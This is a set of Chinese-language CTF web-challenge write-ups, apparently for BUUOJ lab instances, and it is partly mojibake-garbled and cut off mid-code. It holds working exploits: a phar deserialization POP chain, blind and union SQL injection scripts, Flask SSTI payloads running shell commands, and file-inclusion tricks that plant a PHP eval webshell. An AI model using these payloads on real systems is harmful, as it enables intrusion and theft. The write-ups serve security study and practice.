\u0026lt;body\u0026gt; \u0026lt;nav class=\u0026#34;navbar navbar-default\u0026#34; role=\u0026#34;navigation\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;navbar-header\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;index.php\u0026#34;\u0026gt;é¦–é¡µ\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;ul class=\u0026#34;nav navbar-nav navbra-toggle\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;active\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;file.php?file=\u0026#34;\u0026gt;æŸ¥çœ‹æ–‡ä»¶\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;upload_file.php\u0026#34;\u0026gt;ä¸Šä¼ æ–‡ä»¶\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;ul class=\u0026#34;nav navbar-nav navbar-right\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;index.php\u0026#34;\u0026gt;\u0026lt;span class=\u0026#34;glyphicon glyphicon-user\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;?php echo $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;];?\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;!--flag is in f1ag.php--\u0026gt; file.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php header(\u0026#34;content-type:text/html;charset=utf-8\u0026#34;); include \u0026#39;function.php\u0026#39;; include \u0026#39;class.php\u0026#39;; ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/var/www/html/\u0026#39;); $file = $_GET[\u0026#34;file\u0026#34;] ? $_GET[\u0026#39;file\u0026#39;] : \u0026#34;\u0026#34;; if(empty($file)) { echo \u0026#34;\u0026lt;h2\u0026gt;There is no file to show!\u0026lt;h2/\u0026gt;\u0026#34;; } $show = new Show(); if(file_exists($file)) { $show-\u0026gt;source = $file; $show-\u0026gt;_show(); } else if (!empty($file)){ die(\u0026#39;file doesn\\\u0026#39;t exists.\u0026#39;); } ?\u0026gt; function.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;?php //show_source(__FILE__); include \u0026#34;base.php\u0026#34;; header(\u0026#34;Content-type: text/html;charset=utf-8\u0026#34;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;].$_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]).\u0026#34;.jpg\u0026#34;; //mkdir(\u0026#34;upload\u0026#34;,0777); if(file_exists(\u0026#34;upload/\u0026#34; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;],\u0026#34;upload/\u0026#34; . $filename); echo \u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;ä¸Šä¼ æˆåŠŸ!\u0026#34;);\u0026lt;/script\u0026gt;\u0026#39;; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(\u0026#34;gif\u0026#34;,\u0026#34;jpeg\u0026#34;,\u0026#34;jpg\u0026#34;,\u0026#34;png\u0026#34;); $temp = explode(\u0026#34;.\u0026#34;,$_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); $extension = end($temp); if(empty($extension)) { //echo \u0026#34;\u0026lt;h4\u0026gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:\u0026#34; . \u0026#34;\u0026lt;h4/\u0026gt;\u0026#34;; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo \u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;Invalid file!\u0026#34;);\u0026lt;/script\u0026gt;\u0026#39;; return false; } } } ?\u0026gt; class.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 \u0026lt;?php class C1e4r { public $test; public $str; public function __construct($name) { $this-\u0026gt;str = $name; } public function __destruct() { $this-\u0026gt;test = $this-\u0026gt;str; echo $this-\u0026gt;test; } } class Show { public $source; public $str; public function __construct($file) { $this-\u0026gt;source = $file; //$this-\u0026gt;source = phar://phar.jpg echo $this-\u0026gt;source; } public function __toString() { $content = $this-\u0026gt;str[\u0026#39;str\u0026#39;]-\u0026gt;source; return $content; } public function __set($key,$value) { $this-\u0026gt;$key = $value; } public function _show() { if(preg_match(\u0026#39;/http|https|file:|gopher|dict|\\.\\.|f1ag/i\u0026#39;,$this-\u0026gt;source)) { die(\u0026#39;hacker!\u0026#39;); } else { highlight_file($this-\u0026gt;source); } } public function __wakeup() { if(preg_match(\u0026#34;/http|https|file:|gopher|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker~\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test { public $file; public $params; public function __construct() { $this-\u0026gt;params = array(); } public function __get($key) { return $this-\u0026gt;get($key); } public function get($key) { if(isset($this-\u0026gt;params[$key])) { $value = $this-\u0026gt;params[$key]; } else { $value = \u0026#34;index.php\u0026#34;; } return $this-\u0026gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } ?\u0026gt; æ‰“popé“¾åŠ pharååºåˆ—åŒ–\nå…ˆæ‰¾åˆ©ç”¨ç‚¹Testç±»é‡Œé¢çš„file_getå‡½æ•°èƒ½è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¦è§¦å‘__getæ–¹æ³•ï¼Œæ‰¾åˆ°showç±»é‡Œé¢çš„__toStringç„¶ååœ¨C1e4rç±»é‡Œé¢æœ‰echoè§¦å‘\nexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 \u0026lt;?php class C1e4r { public $str; } class Show { public $str; public function __construct() { $this-\u0026gt;str[\u0026#39;str\u0026#39;]=new Test(); } } class Test { public $params; public function __construct() { $this-\u0026gt;params = array(\u0026#34;source\u0026#34; =\u0026gt; \u0026#34;/var/www/html/f1ag.php\u0026#34;); } } $o=new C1e4r(); $o-\u0026gt;str=new Show(); @unlink(\u0026#34;phar.phar\u0026#34;); //ç”Ÿæˆpharæ—¶ï¼Œæ–‡ä»¶çš„åç¼€åå¿…é¡»ä¸ºphar $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); //è®¾ç½®stub $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifestï¼Œè¿™ä¸ªæ˜¯åˆ©ç”¨çš„é‡ç‚¹ $phar-\u0026gt;setMetadata($o); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥ä¸å­˜åœ¨ï¼Œä½†è¿™å¥è¯­å¥ä¸èƒ½å°‘ $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-\u0026gt;stopBuffering(); ?\u0026gt; ä¸Šä¼ åæŸ¥çœ‹uploadè·¯ç”±\nç„¶ååœ¨file.phpé‡Œé¢æœ‰file_existså‡½æ•°å¯ä»¥è§¦å‘ååºåˆ—åŒ–\nOctober 2019 Twice SQL Injection é¢˜ç›®å«äºŒæ¬¡æ³¨å…¥\n1 2 3 4 5 6 7 1\u0026#39; union select database()# 1\u0026#39; union select group_concat(table_name)from information_schema.tables where table_schema=database()# 1\u0026#39; union select group_concat(column_name)from information_schema.columns where table_name=\u0026#39;flag\u0026#39;# 1\u0026#39; union select (select group_concat(flag)from flag)# [GYCTF2020]Ezsqli æ— åˆ—åæ³¨å…¥\nçˆ†è¡¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 import time import requests import sys import string import logging # LOG_FORMAT = \u0026#34;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s\u0026#34; # logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT) target=\u0026#34;http://1412c496-d04b-49dd-86ec-2e57fd4db8d0.node5.buuoj.cn:81/index.php\u0026#34; dataStr=\u0026#34;(select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database())\u0026#34; def binaryTest(i,cu,comparer): s=requests.post(target,data={\u0026#34;id\u0026#34; : \u0026#34;0^(ascii(substr({},{},1)){comparer}{})\u0026#34;.format(dataStr,i,cu,comparer=comparer)}) if \u0026#39;Nu1L\u0026#39; in s.text: return True else: return False def searchFriends_sqli(i): l = 0 r = 255 while (l \u0026lt;= r): cu = (l + r) // 2 if (binaryTest(i, cu, \u0026#34;\u0026lt;\u0026#34;)): r = cu - 1 elif (binaryTest(i, cu, \u0026#34;\u0026gt;\u0026#34;)): l = cu + 1 elif (cu == 0): return None else: return chr(cu) def main(): print(\u0026#34;start\u0026#34;) finres=\u0026#34;\u0026#34; i=1 while (True): extracted_char = searchFriends_sqli(i) if (extracted_char == None): break finres += extracted_char i += 1 print(\u0026#34;(+) å½“å‰ç»“æœ:\u0026#34;+finres) print(\u0026#34;(+) è¿è¡Œå®Œæˆ,ç»“æœä¸º:\u0026#34;, finres) if __name__==\u0026#34;__main__\u0026#34;: main() çˆ†flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import requests import time url = \u0026#39;http://1412c496-d04b-49dd-86ec-2e57fd4db8d0.node5.buuoj.cn:81/index.php\u0026#39; # give_grandpa_pa_pa_pa payload_flag = \u0026#39;1^((1,\\\u0026#39;{}\\\u0026#39;)\u0026gt;(select * from f1ag_1s_h3r3_hhhhh))\u0026#39; flag = \u0026#39;\u0026#39; for i in range(1, 100): time.sleep(0.3)#è¿™é‡Œè¦sleepä¸€ä¸‹ï¼Œä¸ç„¶å¤ªå¿«äº†ä¼šä¹±ç ï¼Œæœ¬äººæµ‹è¯•å0.3æ­£å¥½èƒ½å‡ºç»“æœ low = 32 high = 132 mid = (low + high) // 2 while (low \u0026lt; high): k = flag + chr(mid) payload = payload_flag.format(k) data = {\u0026#34;id\u0026#34;: payload} print(payload) r = requests.post(url=url, data=data) if \u0026#39;Nu1L\u0026#39; in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 if mid == 33: break flag += chr(mid - 1) print(flag.lower()) # å› ä¸ºå‡ºæ¥çš„flagæ˜¯å¤§å†™ï¼Œè¿™è¾¹å…¨éƒ¨è½¬ä¸ºå°å†™ print(flag.lower()) [CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb æœ‰robots.txtï¼ŒæŸ¥çœ‹image.php.bak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php include \u0026#34;config.php\u0026#34;; $id=isset($_GET[\u0026#34;id\u0026#34;])?$_GET[\u0026#34;id\u0026#34;]:\u0026#34;1\u0026#34;; $path=isset($_GET[\u0026#34;path\u0026#34;])?$_GET[\u0026#34;path\u0026#34;]:\u0026#34;\u0026#34;; $id=addslashes($id); $path=addslashes($path); $id=str_replace(array(\u0026#34;\\\\0\u0026#34;,\u0026#34;%00\u0026#34;,\u0026#34;\\\\\u0026#39;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;),\u0026#34;\u0026#34;,$id); $path=str_replace(array(\u0026#34;\\\\0\u0026#34;,\u0026#34;%00\u0026#34;,\u0026#34;\\\\\u0026#39;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;),\u0026#34;\u0026#34;,$path); $result=mysqli_query($con,\u0026#34;select * from images where id=\u0026#39;{$id}\u0026#39; or path=\u0026#39;{$path}\u0026#39;\u0026#34;); $row=mysqli_fetch_array($result,MYSQLI_ASSOC); $path=\u0026#34;./\u0026#34; . $row[\u0026#34;path\u0026#34;]; header(\u0026#34;Content-Type: image/jpeg\u0026#34;); readfile($path); è¦å•å¼•å·å°è¯•æ³¨å…¥ï¼Œè¿™é‡Œçœ‹åˆ°idå…ˆç»è¿‡addslasheså‡½æ•°è½¬ä¹‰ç„¶åå†è¢«str_replaceæ›¿æ¢ä¸ºç©º\næˆ‘ä»¬ç›´æ¥åœ¨idè¿™é‡Œç”¨\\\\0è¿™æ ·\\0ä¼šè¢«è½¬ä¹‰æˆ\\\\0ï¼Œç„¶ååˆè¢«æ›¿æ¢æˆç©ºï¼Œæœ€åå‰©ä¸ª\\æŠŠåé¢çš„å•å¼•å·è½¬ä¹‰\nå¯ä»¥çœ‹ç•Œé¢æœ‰æ— JFIFå­—ç¬¦ä¸²åˆ¤æ–­æ˜¯å¦æœ‰å›¾ç‰‡\npayload\n1 image.php?id=\\\\0\u0026amp;path=or ascii(substring(database(),%s,1))=%s # ç›²æ³¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import requests url = \u0026#34;http://727bcaec-8c37-47b6-8428-161fcbeeeb42.node5.buuoj.cn:81/image.php?id=\\\\0\u0026amp;path=\u0026#34; payload = \u0026#34; or ascii(substr((select password from users),{},1))\u0026gt;{}%23\u0026#34; result = \u0026#39;\u0026#39; for i in range(1,100): high = 127 low = 32 mid = (low+high) // 2 # print(mid) while(high\u0026gt;low): r = requests.get(url + payload.format(i,mid)) # print(url + payload.format(i,mid)) if \u0026#39;JFIF\u0026#39; in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 result += chr(mid) print(result) ç”¨æˆ·åadminï¼Œå¯†ç 84582e71d43b59c72f38\nè¿›æ¥æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ \néšä¾¿ä¸Šä¼ å‘ç°ä¸Šä¼ åˆ°æ—¥å¿—å»äº†ï¼Œç›´æ¥æ–‡ä»¶åå†™æœ¨é©¬,æ—¥å¿—æ–‡ä»¶åŒ…å«\n[RootersCTF2019]I_\u0026lt;3_Flask è‚¯å®šæ‰“sstiï¼Œçˆ†å‚æ•°\n1 {{\u0026#39;\u0026#39;.__class__.__base__.__subclasses__()[182].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls\u0026#34;).read()\u0026#39;)}} æŠ„ä¸€ä¸ªåˆ«äººçš„\n1 ?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read()\u0026#34;) }}{% endif %}{% endfor %} [NPUCTF2020]ezinclude ä¸Šæ¥å…ˆçœ‹æºç \nç”±äºä¸çŸ¥é“$secretçš„å€¼ï¼Œæˆ‘ä»¬å…ˆä¼ ä¸ªnameçœ‹çœ‹\næŠŠå“åº”çš„hashå¡«å…¥å‘åŒ…\n1 ?name=1\u0026amp;pass=576322dd496b99d07b5b0f7fa7934a25 æœ‰ä¸ªflflflflag.php\nä¼ªåè®®è¯»æ–‡ä»¶\n1 ?file=php://filter/read=convert.base64-encode/resource=flflflflag.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script language=\u0026#34;javascript\u0026#34; type=\u0026#34;text/javascript\u0026#34;\u0026gt; window.location.href=\u0026#34;404.html\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;title\u0026gt;this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php $file=$_GET[\u0026#39;file\u0026#39;]; if(preg_match(\u0026#39;/data|input|zip/is\u0026#39;,$file)){ die(\u0026#39;nonono\u0026#39;); } @include($file); echo \u0026#39;include($_GET[\u0026#34;file\u0026#34;])\u0026#39;; ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ç›®å½•æ‰«æä¼šå‘ç°dir.php\n1 2 3 \u0026lt;?php var_dump(scandir(\u0026#39;/tmp\u0026#39;)); ?\u0026gt; ç„¶å\næ³•ä¸€ï¼šåˆ©ç”¨php7 segment faultç‰¹æ€§ï¼ˆCVE-2018-14884ï¼‰ phpä»£ç ä¸­ä½¿ç”¨php://filterçš„ strip_tags è¿‡æ»¤å™¨, å¯ä»¥è®© php æ‰§è¡Œçš„æ—¶å€™ç›´æ¥å‡ºç° Segment Fault , è¿™æ · php çš„åƒåœ¾å›æ”¶æœºåˆ¶å°±ä¸ä¼šåœ¨ç»§ç»­æ‰§è¡Œ , å¯¼è‡´ POST çš„æ–‡ä»¶ä¼šä¿å­˜åœ¨ç³»ç»Ÿçš„ç¼“å­˜ç›®å½•ä¸‹ä¸ä¼šè¢«æ¸…é™¤è€Œä¸åƒphpinfoé‚£æ ·ä¸Šä¼ çš„æ–‡ä»¶å¾ˆå¿«å°±ä¼šè¢«åˆ é™¤ï¼Œè¿™æ ·çš„æƒ…å†µä¸‹æˆ‘ä»¬åªéœ€è¦çŸ¥é“å…¶æ–‡ä»¶åå°±å¯ä»¥åŒ…å«æˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚\nä½¿ç”¨php://filter/string.strip_tagså¯¼è‡´phpå´©æºƒæ¸…ç©ºå †æ ˆé‡å¯ï¼Œå¦‚æœåœ¨åŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªtmp fileå°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•ï¼ŒçŸ¥é“æ–‡ä»¶åå°±å¯ä»¥getshellã€‚è¿™ä¸ªå´©æºƒåŸå› æ˜¯å­˜åœ¨ä¸€å¤„ç©ºæŒ‡é’ˆå¼•ç”¨ã€‚å‘PHPå‘é€å«æœ‰æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…æ—¶ï¼Œè®©PHPå¼‚å¸¸å´©æºƒé€€å‡ºï¼ŒPOSTçš„ä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«ä¿ç•™ï¼Œä¸´æ—¶æ–‡ä»¶ä¼šè¢«ä¿å­˜åœ¨upload_tmp_diræ‰€æŒ‡å®šçš„ç›®å½•ä¸‹ï¼Œé»˜è®¤ä¸ºtmpæ–‡ä»¶å¤¹ã€‚\nè¯¥æ–¹æ³•ä»…é€‚ç”¨äºä»¥ä¸‹php7ç‰ˆæœ¬ï¼Œphp5å¹¶ä¸å­˜åœ¨è¯¥å´©æºƒã€‚\n1 2 3 4 5 php7.0.0-7.1.2å¯ä»¥åˆ©ç”¨ï¼Œ 7.1.2xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤ php7.1.3-7.2.1å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.1xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤ php7.2.2-7.2.8å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.9ä¸€ç›´åˆ°7.3åˆ°ç°åœ¨çš„ç‰ˆæœ¬å·²è¢«ä¿®å¤ åˆ©ç”¨url\n1 /flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd æ‰“è¿™ä¸ªcve\n1 2 3 4 5 6 import requests from io import BytesIO #BytesIOå®ç°äº†åœ¨å†…å­˜ä¸­è¯»å†™bytes payload = \u0026#34;\u0026lt;?php eval($_POST[cmd]);?\u0026gt;\u0026#34; data={\u0026#39;file\u0026#39;: BytesIO(payload.encode())} url=\u0026#34;http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\u0026#34; r=requests.post(url=url,files=data,allow_redirects=False) è¿™æ ·å°±åœ¨tmpç›®å½•ä¸‹å†™å…¥æœ¨é©¬äº†\næˆ‘ä»¬ç”¨dir.phpæŸ¥çœ‹ä½ç½®\n1 http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php?file=/tmp/php3r0kqs è¿æ¥ä¸Šç”¨èšå‰‘æ’ä»¶ç»•è¿‡ï¼Œå‘ç°ä¸è¡Œï¼Œbpåœ¨postä¼ å‚cmd=phpinfo()çœ‹çœ‹ï¼Œç›´æ¥æœflagå°±æœ‰äº†\næ³•äºŒï¼šåˆ©ç”¨ session.upload_progress è¿›è¡Œ session æ–‡ä»¶åŒ…å« 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import io import re import sys import requests import threading host = \u0026#39;http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php\u0026#39; sessid = \u0026#39;yym68686\u0026#39; def POST(session): while True: f = io.BytesIO(b\u0026#39;a\u0026#39; * 1024 * 50) session.post( host, data={\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34;:\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34;}, files={\u0026#34;file\u0026#34;:(\u0026#39;a.txt\u0026#39;, f)}, cookies={\u0026#39;PHPSESSID\u0026#39;:sessid} ) def READ(session): while True: response = session.get(f\u0026#39;{host}?file=/tmp/sess_{sessid}\u0026#39;) if \u0026#39;flag{\u0026#39; not in response.text: print(\u0026#39;\\rWaiting...\u0026#39;, end=\u0026#34;\u0026#34;) else: print(\u0026#34;\\r\u0026#34; + re.search(r\u0026#39;flag{(.*?)}\u0026#39;, response.text).group(0)) sys.exit(0) with requests.session() as session: t1 = threading.Thread(target=POST, args=(session, )) t1.daemon = True t1.start() READ(session) [NCTF2019]SQLi æœ‰ä¸ªrobots.txt\nè¿™é‡Œwafäº†ä¸€å †å…³é”®å­—,ç”¨æˆ·åæ˜¯admin\nä¸»è¦ç”¨regexpæ­£åˆ™æ¥ç»•è¿‡\npayload\n1 select * from users where username=\u0026#39;\\\u0026#39; and passwd=\u0026#39;||/**/passwd/**/regexp/**/\\\u0026#34;^a\\\u0026#34;;%00\u0026#39; 1 payload: username=\\\u0026amp;passwd=||passwd/**/regexp/**/\u0026#34;^a\u0026#34;;%00 é€šè¿‡\\ è½¬ä¹‰usernameåç¬¬äºŒä¸ªå•å¼•å·è¿›è€Œé—­åˆæ‰passwdåç¬¬ä¸€ä¸ªå¼•å· é€šè¿‡%00æˆªæ–­ ä»£æ›¿# â€“ regexp â€œ^aâ€ è¡¨ç¤º æŸ¥æ‰¾passwdåˆ—ä¸­ä»¥aä¸ºèµ·å§‹çš„ å¦‚æœæ³¨å…¥æˆåŠŸä¼šå›æ˜¾welcome.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import requests from urllib.parse import unquote import string url = \u0026#39;http://eec98765-3741-49a5-8773-6d1b31843e2e.node5.buuoj.cn:81/\u0026#39; cookies = { \u0026#39;UM_distinctid\u0026#39;: \u0026#39;17e150f6a59ecb-028dcf28d64a708-4c3e2679-384000-17e150f6a5a90d\u0026#39;, } headers = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\u0026#39;, \u0026#39;Accept-Language\u0026#39;: \u0026#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, \u0026#39;Origin\u0026#39;: \u0026#39;http://011634d2-f820-4831-b422-832c2e0bf99f.node4.buuoj.cn:81\u0026#39;, \u0026#39;Connection\u0026#39;: \u0026#39;keep-alive\u0026#39;, \u0026#39;Referer\u0026#39;: \u0026#39;http://011634d2-f820-4831-b422-832c2e0bf99f.node4.buuoj.cn:81/\u0026#39;, \u0026#39;Upgrade-Insecure-Requests\u0026#39;: \u0026#39;1\u0026#39;, } table = string.ascii_letters + string.digits + \u0026#39;_{}\u0026#39; flag = \u0026#39;\u0026#39; for j in range(50): for i in table: data = { \u0026#39;username\u0026#39;: \u0026#39;\\\\\u0026#39;, \u0026#39;passwd\u0026#39;: f\u0026#39;||(passwd/**/regexp/**/\u0026#34;^{flag + i}\u0026#34;);\u0026#39; + unquote(\u0026#39;%00\u0026#39;) } response = requests.post(url, headers=headers, cookies=cookies, data=data) if \u0026#39;404 Not Found\u0026#39; in response.text: flag = flag + i break else: continue print(str.lower(flag)) [ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite index.php\n1 2 3 4 5 6 7 8 \u0026lt;?php $action = (isset($_GET[\u0026#39;action\u0026#39;]) ? $_GET[\u0026#39;action\u0026#39;] : \u0026#39;home.php\u0026#39;); if (file_exists($action)) { include $action; } else { echo \u0026#34;File not found!\u0026#34;; } ?\u0026gt; æœ‰æ–‡ä»¶åŒ…å«ï¼Œç„¶åç”¨ç›®å½•ç©¿è¶Šè¯»åˆ°flag\n[HarekazeCTF2019]encode_and_encode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;?php error_reporting(0); if (isset($_GET[\u0026#39;source\u0026#39;])) { show_source(__FILE__); exit(); } function is_valid($str) { $banword = [ // no path traversal \u0026#39;\\.\\.\u0026#39;, // no stream wrapper \u0026#39;(php|file|glob|data|tp|zip|zlib|phar):\u0026#39;, // no data exfiltration \u0026#39;flag\u0026#39; ]; $regexp = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $banword) . \u0026#39;/i\u0026#39;; if (preg_match($regexp, $str)) { return false; } return true; } $body = file_get_contents(\u0026#39;php://input\u0026#39;); $json = json_decode($body, true); if (is_valid($body) \u0026amp;\u0026amp; isset($json) \u0026amp;\u0026amp; isset($json[\u0026#39;page\u0026#39;])) { $page = $json[\u0026#39;page\u0026#39;]; $content = file_get_contents($page); if (!$content || !is_valid($content)) { $content = \u0026#34;\u0026lt;p\u0026gt;not found\u0026lt;/p\u0026gt;\\n\u0026#34;; } } else { $content = \u0026#39;\u0026lt;p\u0026gt;invalid request\u0026lt;/p\u0026gt;\u0026#39;; } // no data exfiltration!!! $content = preg_replace(\u0026#39;/HarekazeCTF\\{.+\\}/i\u0026#39;, \u0026#39;HarekazeCTF{\u0026amp;lt;censored\u0026amp;gt;}\u0026#39;, $content); echo json_encode([\u0026#39;content\u0026#39; =\u0026gt; $content]); unicodeç¼–ç ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œå› ä¸ºjson_decodeæ—¶ä¼šæŠŠunicodeç¼–ç è½¬ç \njsonæ ¼å¼çš„pageä¼ ä¼ªåè®®è¯»flag\n1 2 {\u0026#34;page\u0026#34;:\u0026#34;php://filter/convert.base64-encode/resource=/flag\u0026#34;} {\u0026#34;page\u0026#34;:\u0026#34;\\u0070\\u0068\\u0070\\u003A\\u002F\\u002F\\u0066\\u0069\\u006C\\u0074\\u0065\\u0072\\u002F\\u0063\\u006F\\u006E\\u0076\\u0065\\u0072\\u0074\\u002E\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002D\\u0065\\u006E\\u0063\\u006F\\u0064\\u0065\\u002F\\u0072\\u0065\\u0073\\u006F\\u0075\\u0072\\u0063\\u0065\\u003D\\u002F\\u0066\\u006C\\u0061\\u0067\u0026#34;} [SUCTF 2019]EasyWeb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;?php function get_the_flag(){ // webadmin will remove your upload file every 20 min!!!! $userdir = \u0026#34;upload/tmp_\u0026#34;.md5($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); if(!file_exists($userdir)){ mkdir($userdir); } if(!empty($_FILES[\u0026#34;file\u0026#34;])){ $tmp_name = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]; $name = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; $extension = substr($name, strrpos($name,\u0026#34;.\u0026#34;)+1); if(preg_match(\u0026#34;/ph/i\u0026#34;,$extension)) die(\u0026#34;^_^\u0026#34;); if(mb_strpos(file_get_contents($tmp_name), \u0026#39;\u0026lt;?\u0026#39;)!==False) 